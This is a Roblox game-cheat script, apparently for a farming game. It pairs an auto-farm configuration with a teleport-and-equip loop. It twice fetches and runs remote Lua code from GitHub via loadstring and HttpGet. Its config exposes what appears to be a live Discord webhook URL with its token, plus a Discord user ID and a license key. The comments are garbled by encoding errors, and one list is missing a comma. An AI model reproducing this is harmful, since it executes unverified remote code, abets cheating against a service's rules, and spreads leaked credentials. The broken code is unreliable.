
task.spawn(function() 
loadstring(game:HttpGet("https://raw.githubusercontent.com/FnDXueyi/roblog/refs/heads/main/status.lua", true))()
end)

getgenv().ConfigsKaitun = {
	Beta_Fix_Data_Sync = false,

	NoDeletePlayer = true,

	["Block Pet Gift"] = false,

	Collect_Cooldown = 90, -- cooldown to collect fruit

	["Low Cpu"] = true,
	["Auto Rejoin"] = false,

	["Rejoin When Update"] = true,

	["Auto Trade Pet"] = { -- beta idk it work or no
		["Enabled"] = false, 
		["Target"] =  { -- multi users
			"username1",
			"username2",
		},
		["Pet To Send"] = {
			
		}
	},

	Ascend = {
		Enabled = true,
		Max_Rebirth_Money = 1_000_000_000_000,
		Shop = {
			"Egg Capacity"
		}
	},

	["Limit Tree"] = {
		["Limit"] = 250,
		["Destroy Until"] = 200,

		["Safe Tree"] = {
			"Moon Blossom",
			"Bone Blossom",
			"Moon Melon",
			"Maple Apple",
			"Moon Mango",
			"Dragon Pepper",
			"Elephant Ears",
			"Fossilight",
			"Princess Thorn",
			-- for the event
			Bamboo = 4,
			Coconut = 15,
			Mushroom = 4,
			Glowthorn = 4,
			Tomato = 15,
			Pumpkin = 4,
			Pepper = 4,
			Cacao = 15,
			Apple = 15,
			Romanesco = 4,
			["Elder Strawberry"] = 4,
			["Burning Bud"] = 4,
			["Giant Pinecone"] = 4,
			Corn = 4,
			["Sugar Apple"] = 4,
			["Ember Lily"] = 4,
			["Dragon Fruit"] = 15,
			Sunbulb = 8,
			["Orange Tulip"] = 4,
			Blueberry = 15,
			Watermelon = 4,
			Mango = 15,
			Cactus = 4,
			Strawberry = 15,
			Beanstalk = 4,
			Lightshoot = 4,
			Grape = 4,
			Daffodil = 4,
		}
	},

	Seed = {
		Buy = {
			Mode = "Auto", -- Custom , Auto
			Custom = { -- any seed u need to buy
				"Carrot",
			}
		},
		Place = {
			Mode = "Lock", -- Select , Lock
			Select = {
				"Carrot"
			},
			Lock = {
				"Maple Apple",
				"Sunflower",
				"Dragon Pepper",
				"Elephant Ears",
				"Moon Melon",
				"Easter Egg",
				"Moon Mango",
				"Bone Blossom",
				"Fossilight",
			}
		}
	},

	["Seed Pack"] = {
		Locked = {
			["Enchanted Seed Pack"] = 10,
		}
	},

	Events = {
		-- MaxMoney_Restocks = 1_000_000_000_000,
		
		Shop = { -- un comment to buy
			"Evo Beetroot I",
			"Evo Blueberry I",
			"Evo Pumpkin I",
			"Evo Mushroom I",
		},
		["Traveling Shop"] = {
			"Bee Egg",
			"Paradise Egg", 
			"Rare Summer Egg", 
			"Common Summer Egg"
		},
		Craft = {
			"Anti Bee Egg",
			"Enchanted Chest",
			"Enchanted Egg",
			"Pet Shard GiantBean",
			"Sprout Egg",
		},
		Start_Do_Honey = 2_000_000 -- start trade fruit for honey at money
	},

	Gear = {
		Buy = { 
			"Master Sprinkler",
			"Godly Sprinkler",
			"Advanced Sprinkler",
			"Basic Sprinkler",
			"Lightning Rod",
			"Level Up Lollipop",
			"Medium Treat",
			"Medium Toy",
			"Harvest Tool",
		},
		Lock = {
			"Master Sprinkler",
			"Godly Sprinkler",
			"Advanced Sprinkler",
			"Basic Sprinkler",
			"Lightning Rod",
		},
	},

	Eggs = {
		Place = {
			"Jungle Egg",
			"Anti Bee Egg",
			"Bug Egg",
			"Fall Egg",
			"Enchanted Egg",
			"Sprout Egg",
			"Gourmet Egg",
			"Zen Egg",
			"Primal Egg",
			"Dinosaur Egg",
			"Oasis Egg",
			"Night Egg",
			"Paradise Egg",
			"Bee Egg",
			"Rare Egg"
		},
		Buy = {
			"Jungle Egg"
			"Bee Egg",
			"Oasis Egg",
			"Paradise Egg",
			"Anti Bee Egg",
			"Night Egg",
			"Rare Summer Egg",
			"Bug Egg",
			"Mythical Egg",
			"Uncommon Egg",
			"Common Egg",
		}
	},

	Pets = {
		["Auto Feed"] = true,

		MutationPet = {
			["PET NAME"] = { "Glimmering","... any other" }
		},

		["Start Delete Pet At"] = 50,
		["Upgrade Slot"] = {
			["Pet"] = {
				["Starfish"] = { 1, 100, 7 , true }, -- the "true" on the last is auto equip (use for like only need to use for upgrade pet)
			},
			["Limit Upgrade"] = 5, -- max is 5 (more than or lower than 1 will do nothing)
			["Equip When Done"] = {
				["Tarantula Hawk"] = { 1, 100, 1 },
				["Sunny-Side Chicken"] = { 4, 100, 2 }, 
				["Hotdog Daschund"] = { 4, 100, 3 },
				["Blood Kiwi"] = { 8, 100, 4 },
				["Rooster"] = { 8, 100, 5 },
				["Starfish"] = { 1, 100, 6 },
			},
		},
		Unfavorite_AllPet = false,
		Favorite_LockedPet = false,
		Locked_Pet_Age = 60, -- pet that age > 60 will lock
		Locked = {
			"Tiger",
			"Swan",
			"Red Panda",
			"Space Squirrel",
			"Barn Owl",
			"Phoenix",
			["Shroomie"] = 2,
			["Drake"] = 2,
			["Luminous Sprite"] = 2,
			"Griffin",
			["Glimmering Sprite"] = 5,
			"Cockatrice",
			"Golem",
			"Gnome",
			"Green Bean", 
			"Apple Gazelle", 
			"Lemon Lion", 
			"Peach Wasp",
			"Golden Goose",
			["Spriggan"] = 5,
			["Gorilla Chef"] = 4,
			"Junkbot",
			"Hotdog Daschund",
			"Sunny-Side Chicken",
			"Lobster Thermidor",
			"French Fry Ferret",
			["Starfish"] = 8,
			"Raiju",
			"Corrupted Kodama",
			["Rooster"] = 4,
			"Capybara",
			["Koi"] = 2,
			["Tanchozuru"] = 3,
			["Moth"] = 3, 
			"Kitsune",
			"Corrupted Kitsune",
			"Dilophosaurus",
			"Spinosaurus",
			"Brontosaurus",
			"T-Rex",
			"Fennec Fox",
			"Blood Kiwi",
			["Hamster"] = 2,
			"Disco Bee",
			"Raccoon",
			"Queen Bee",
			"Dragonfly",
			"Butterfly",
			["Tarantula Hawk"] = 2,
			["Wasp"] = 2,
			["Honey Bee"] = 2,
			["Bee"] = 2,
			"Mimic Octopus",
			"Red Fox",
			"Chicken Zombie"
		},
		LockPet_Weight = 5, -- if Weight >= 10 they will locked
		Ignore_Pet_Weight = {
		},
		Instant_Sell = {
		}
	},
	Webhook = {
		UrlPet = "https://discord.com/api/webhooks/1305948515234742362/S6IwN-9JA-jpemtbv5GUCTyTlzhA5rpH6ac7JrVMQQid8ieYlxEZ46IYyHDQG0hlOAA2",
		UrlSeed = "xxx",
		PcName = "dew",

		Mention = "474925167886336001", -- discord id

		Noti = {
			Seeds = {
				"Sunflower",
				"Dragon Pepper",
				"Elephant Ears",
			},
			SeedPack = {
				"Idk"
			},
			Pets = {
				"Tiger",
				"Space Squirrel",
				"Swan",
				"Phoenix",
				"Golden Goose",
				"French Fry Ferret",
				"Cockatrice",
				"Kitsune",
				"Spinosaurus",
				"T-Rex",
				"Disco Bee",
				"Butterfly",
				"Mimic Octopus",
				"Queen Bee",
				"Fennec Fox",
				"Dragonfly",
				"Raccoon",
			},
			Pet_Weight_Noti = true,
		}
	},
}
License = "rArFHz2PIoe3oLPKHem8gfjehPKwrIJX"

loadstring(game:HttpGet('https://raw.githubusercontent.com/Real-Aya/Loader/main/Init.lua'))()
local Players = game:GetService('Players')
local ReplicatedStorage = game:GetService('ReplicatedStorage')
local Workspace = game:GetService('Workspace')

local localPlayer = Players.LocalPlayer

-- Ch·ªù nh√¢n v·∫≠t load
local character = localPlayer.Character or localPlayer.CharacterAdded:Wait()
local hrp = character:WaitForChild('HumanoidRootPart')

-- üìç T·ªça ƒë·ªô c·∫ßn teleport
local targetPos =
    Vector3.new(30.605241775512695, 2.999999761581421, -102.87364959716797)

-- L·∫•y module CosmeticService
local CosmeticService =
    require(ReplicatedStorage.Modules.CosmeticServices.CosmeticService)

-- H√†m ki·ªÉm tra v√† equip Pancake Stack
local function equipPancakeStack()
    local allOwned = CosmeticService:GetAllCosmetics() or {}
    local allEquipped = CosmeticService:GetAllEquippedCosmetics() or {}

    for id, data in pairs(allOwned) do
        if data.Name == 'Pancake Stack' then
            if allEquipped[id] then
                print('‚úÖ Pancake Stack ƒë√£ equip')
                return true
            else
                local success = CosmeticService:Equip(id)
                if success then
                    print('üéâ Pancake Stack ƒë√£ ƒë∆∞·ª£c equip!')
                    return true
                else
                    print(
                        '‚ùå Kh√¥ng th·ªÉ equip Pancake Stack (server c√≥ th·ªÉ ch∆∞a unlock ho·∫∑c max equipped)'
                    )
                    return false
                end
            end
        end
    end

    print('‚ùå Kh√¥ng t√¨m th·∫•y Pancake Stack trong inventory')
    return false
end

-- H√†m check trong v∆∞·ªùn xem ƒë√£ c√≥ Pancake Stack ch∆∞a
local function hasPancakeInFarm()
    local farmPath = Workspace:FindFirstChild('Farm')
    if not farmPath then
        return false
    end

    local important = farmPath:FindFirstChild('Farm')
        and farmPath.Farm:FindFirstChild('Important')
    if not important then
        return false
    end

    local cosmetic = important:FindFirstChild('Cosmetic_Physical')
    if not cosmetic then
        return false
    end

    local part = cosmetic:FindFirstChild('Part')
    if not part then
        return false
    end

    local pancake = part:FindFirstChild('Pancake Stack')
    if pancake and #pancake:GetChildren() > 0 then
        -- C√≥ fodel/model con trong Pancake Stack
        return true
    end

    return false
end

-- üîÑ V√≤ng l·∫∑p ch√≠nh
task.spawn(function()
    while true do
        if not hasPancakeInFarm() then
            -- Ch∆∞a c√≥ trong farm => th·ª±c hi·ªán teleport + equip
            hrp.CFrame = CFrame.new(targetPos)
            print('‚úÖ ƒê√£ teleport ƒë·∫øn v·ªã tr√≠:', targetPos)

            task.wait(0.5) -- ƒê·ª£i teleport ·ªïn ƒë·ªãnh

            local equipped = equipPancakeStack()
            if equipped then
                task.wait(10) -- ngh·ªâ l√¢u h∆°n n·∫øu th√†nh c√¥ng
            else
                task.wait(2) -- retry nhanh h∆°n n·∫øu fail
            end
        else
            -- ƒê√£ c√≥ Pancake Stack trong farm => b·ªè qua
            print(
                '‚ö†Ô∏è Pancake Stack ƒë√£ c√≥ trong farm, b·ªè qua v√≤ng n√†y'
            )
            task.wait(5)
        end
    end
end)
